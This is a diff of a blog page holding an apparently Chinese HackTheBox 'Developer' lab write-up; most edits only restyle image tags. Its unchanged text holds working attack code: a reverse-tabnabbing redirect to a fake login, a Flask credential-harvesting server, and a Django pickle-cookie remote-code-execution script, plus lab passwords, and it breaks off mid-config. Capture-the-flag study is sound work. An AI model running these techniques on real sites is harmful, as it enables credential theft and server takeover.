@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;372 10.10.11.103   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.11.103Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-18 12:53 CS">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;372 10.10.11.103                                                                                                              端口扫描22和80: 123456789">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Developer - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/01/18/Developer-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;372 10.10.11.103   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.11.103Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-18 12:53 CS">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;372 10.10.11.103                                                                                                              端口扫描22和80: 123456789">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022011801.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022011802.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022011803.jpg">
@@ -135,7 +135,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -224,7 +224,14 @@
 <li><a href="https://www.hackthebox.com/home/machines/profile/372" target="_blank" rel="noopener">https://www.hackthebox.com/home/machines/profile/372</a></li>
 <li>10.10.11.103</li>
 </ul>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011801.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011801.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.11.103</span></span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-18 12:53 CST</span><br><span class="line">Nmap scan report for 10.10.11.103</span><br><span class="line">Host is up (0.21s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 36:aa:93:e4:a4:56:ab:39:86:66:bf:3e:09:fa:eb:e0 (RSA)</span><br><span class="line">|   256 11:fb:e9:89:2e:4b:66:40:7b:6b:01:cf:f2:f2:ee:ef (ECDSA)</span><br><span class="line">|_  256 77:56:93:6e:5f:ea:e2:ad:b0:2e:cf:23:9d:66:ed:12 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41</span><br><span class="line">|_http-title: Did not follow redirect to http://developer.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">Service Info: Host: developer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 75.56 seconds</span><br></pre></td></tr></table></figure>
 
@@ -233,9 +240,23 @@
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>加hosts后访问,一个CTF练习平台：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.103 developer.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011802.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011802.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p>注册登录后，有一些CTF练习：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011803.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011803.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="challenge-PSE"><a href="#challenge-PSE" class="headerlink" title="challenge PSE"></a>challenge PSE</h2><p>需要完成任意一个challenge后，会出现提交writeup功能：</p>
 <p>PSE这个就是PS2EXE，还原出来一个powershell，根据其中的加密函数对应解密：</p>
 <ul>
@@ -245,7 +266,14 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DHTB&#123;P0w3rsh3lL_F0r3n51c_M4dn3s5&#125;</span><br></pre></td></tr></table></figure>
 
 <p>提交后，出现submit walkthrough功能：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011804.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011804.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="challenge-Phished-List"><a href="#challenge-Phished-List" class="headerlink" title="challenge Phished List"></a>challenge Phished List</h2><p>受保护的xlsx中有一列隐藏，去除保护后在其中得到flag</p>
 <ul>
 <li>EASILY UNLOCK Protected Excel Sheets WITHOUT Password - YouTube<br><a href="https://www.youtube.com/watch?v=2x23vZIRYRs&amp;ab_channel=LeilaGharani" target="_blank" rel="noopener">https://www.youtube.com/watch?v=2x23vZIRYRs&amp;ab_channel=LeilaGharani</a></li>
@@ -276,9 +304,23 @@
 
 
 <h2 id="check-walkthrough"><a href="#check-walkthrough" class="headerlink" title="check walkthrough"></a>check walkthrough</h2><p>任意一个challenge提交wp链接后，应该是管理员定是查看，大概两分钟一次</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011805.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011805.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>简单的目录扫描可以发现是django：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011806.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011806.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="reverse-tabnabbing"><a href="#reverse-tabnabbing" class="headerlink" title="reverse tabnabbing"></a>reverse tabnabbing</h1><ul>
 <li>HackTheBox was vulnerable to reverse tabnabbing | 0xPrashant Blog<br><a href="https://blog.0xprashant.in/posts/htb-bug/" target="_blank" rel="noopener">https://blog.0xprashant.in/posts/htb-bug/</a></li>
 </ul>
@@ -287,7 +329,14 @@
 <h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>就是自己writeup里将返回界面设置为fake login,action指向自己的login函数记录密码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.14.2:7777&#x2F;writeup</span><br><span class="line"></span><br><span class="line">csrfmiddlewaretoken: Example1</span><br><span class="line">login: admin</span><br><span class="line">password: SuperSecurePassword@HTB2021</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011807.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011807.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="writeup-html"><a href="#writeup-html" class="headerlink" title="writeup.html"></a>writeup.html</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Challenge Writeup<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>This challenge was quite well designed! Good job by the developers at Developer for this one. I would definitely recommend it to my friends. It required critical thinking and tools like Ghidra to get the job done<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (<span class="built_in">window</span>.opener) <span class="built_in">window</span>.opener.parent.location.replace(<span class="string">'http://10.10.14.2:7777/accounts/login/'</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (<span class="built_in">window</span>.parent != <span class="built_in">window</span>) <span class="built_in">window</span>.parent.location.replace(<span class="string">'https://10.10.14.2:7777/accounts/login/'</span>);           </span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="app-py"><a href="#app-py" class="headerlink" title="app.py"></a>app.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__, template_folder=<span class="string">'.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/writeup")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeup</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'writeup.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/accounts/login/", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        print(<span class="string">'\n'</span>.join([<span class="string">f'<span class="subst">&#123;x[<span class="number">0</span>]&#125;</span>: <span class="subst">&#123;x[<span class="number">1</span>]&#125;</span>'</span> <span class="keyword">for</span> x <span class="keyword">in</span> request.form.items()]))</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">"http://10.10.11.103/accounts/login/"</span>, code=<span class="number">302</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'loginform.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, port=<span class="number">7777</span>)</span><br></pre></td></tr></table></figure>
@@ -296,25 +345,69 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"author"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"/img/favicon.ico"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"http://developer.htb/static/css/jquery.toasts.css"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://developer.htb/static/js/all.min.js"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://developer.htb/static/js/jquery-3.2.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login | Developer.HTB<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap core CSS --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"http://developer.htb/static/css/bootstrap.min.css"</span> <span class="attr">integrity</span>=<span class="string">"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Custom styles for this template --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"http://developer.htb/static/css/signin.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-signin"</span> <span class="attr">action</span>=<span class="string">"/accounts/login"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"csrfmiddlewaretoken"</span> <span class="attr">value</span>=<span class="string">"Example1"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"mb-4"</span> <span class="attr">src</span>=<span class="string">"http://developer.htb/static/img/logo.png"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"72"</span> <span class="attr">height</span>=<span class="string">"72"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"h3 mb-3 font-weight-normal"</span>&gt;</span>Welcome back!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"uname"</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>User Name<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"id_login"</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">required</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">id</span>=<span class="string">"id_password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">required</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"loginbtn"</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-primary btn-block"</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>Sign in<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/accounts/password/reset/"</span> <span class="attr">class</span>=<span class="string">"auth-link"</span>&gt;</span>Forgot password?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center mt-4 font-weight-light"</span>&gt;</span> Don't have an account? <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/accounts/signup/"</span> &gt;</span>Click here!<span class="tag">&lt;/<span class="name">a</span>&gt;</span>      </span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"mt-5 mb-3 text-muted"</span>&gt;</span>&amp;copy; Developer.HTB 2021<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://developer.htb/static/js/jquery.toast.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h1><p>diango admin界面发现另一个site，加hosts后访问：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011808.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011808.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="developer-sentry-developer-htb"><a href="#developer-sentry-developer-htb" class="headerlink" title="developer-sentry.developer.htb"></a>developer-sentry.developer.htb</h2><p>账号是django admin那里得到的用户名：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jacob@developer.htb SuperSecurePassword@HTB2021</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011809.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011809.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h2><p>执行一些操作触发报错，例如创建一个项目后再删除，报错信息中得到配置信息，包括secret：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;system.secret-key&#39;: &#39;c7f3a64aa184b7cbb1a7cbe9cd544913&#39;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011810.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011810.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="diango-rce"><a href="#diango-rce" class="headerlink" title="diango rce"></a>diango rce</h2><p>就是diango的cookie可以使用pickle反序列化，有secret就可以构造出任意cookie：</p>
 <ul>
 <li>Remote Code Execution on a Facebook server – Sec Team Blog<br><a href="https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/" target="_blank" rel="noopener">https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/</a></li>
 </ul>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011811.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011812.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011811.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011812.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h2 id="diango-rce-py"><a href="#diango-rce-py" class="headerlink" title="diango_rce.py"></a>diango_rce.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">import</span> django.core.signing, django.contrib.sessions.serializers</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">SECRET_KEY=<span class="string">'c7f3a64aa184b7cbb1a7cbe9cd544913'</span></span><br><span class="line"><span class="comment">#Initial cookie I had on sentry when trying to reset a password</span></span><br><span class="line">cookie=<span class="string">".eJxrYKotZNQI5UxMLsksS80vSi9kimBjYGAoTs0rKaosZA5lKS5NyY_gAQqVGuS55IZFFIeUGTpHcAEFSlKLS5Lz87MzU8FayvOLslNTQnnjE0tLMuJLi1OL4jNTvFlDhZAEkhKTs1PzUkKVIObrlZZk5hTrgeT1XHMTM3McgSwniJpSPQDm9TPf:1n9hcy:HpZvM4Joi_Uu5WcsvPd9o2xXrUY"</span></span><br><span class="line">newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=<span class="string">'django.contrib.sessions.backends.signed_cookies'</span>)                              </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleRce</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(cmd,))</span><br><span class="line">newContent[<span class="string">'testcookie'</span>] = PickleRce()</span><br><span class="line"></span><br><span class="line">cookie = django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt=<span class="string">'django.contrib.sessions.backends.signed_cookies'</span>,compress=<span class="keyword">True</span>)                 </span><br><span class="line">print(<span class="string">"Forged cookie:\n"</span> + cookie)</span><br><span class="line"></span><br><span class="line">requests.get(<span class="string">"http://developer-sentry.developer.htb/sentry/"</span>, cookies=&#123;<span class="string">"sentrysid"</span>: cookie&#125;)</span><br></pre></td></tr></table></figure>
 
 <h1 id="Postgres"><a href="#Postgres" class="headerlink" title="Postgres"></a>Postgres</h1><p><code>/var/www/developer_ctf/developer_ctf/settings.py</code> 里得到postgresql配置信息：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011813.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022011813.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p><code>/etc/sentry/sentry.conf.py</code> 中是另一组账号密码：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    'default': &#123;</span><br><span class="line">        'ENGINE': 'django.db.backends.postgresql',</span><br><span class="line">        'NAME': 'platform',</span><br><span class="line">        'USER': 'ctf_admin',</span><br><span class="line">        'PASSWORD': 'CTFOG2021',</span><br><span class="line">        'HOST': 'localhost',</span><br><span class="line">        'PORT': '',</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DATABASES = &#123;                                       </span><br><span class="line">    'default': &#123;</span><br><span class="line">        'ENGINE': 'sentry.db.postgres',</span><br><span class="line">        'NAME': 'sentry',                           </span><br><span class="line">        'USER': 'sentry',</span><br><span class="line">        'PASSWORD': 'SentryPassword2021',</span><br><span class="line">        